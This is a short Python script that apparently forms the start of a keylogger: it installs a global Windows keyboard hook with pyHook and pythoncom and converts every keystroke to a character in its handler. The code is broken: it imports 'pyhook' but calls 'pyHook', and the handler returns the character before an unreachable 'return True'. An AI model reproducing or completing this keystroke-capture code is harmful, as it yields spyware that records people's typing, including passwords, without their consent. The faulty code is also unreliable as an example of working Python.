import pyhook, pythoncom, sys
def run(*args):
    print("[*] testing")
    def OnKeyboardEvent(event):
        chr(event.Ascii)
        test = chr(event.Ascii)
        return str(test)
        return True

    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()
    
   
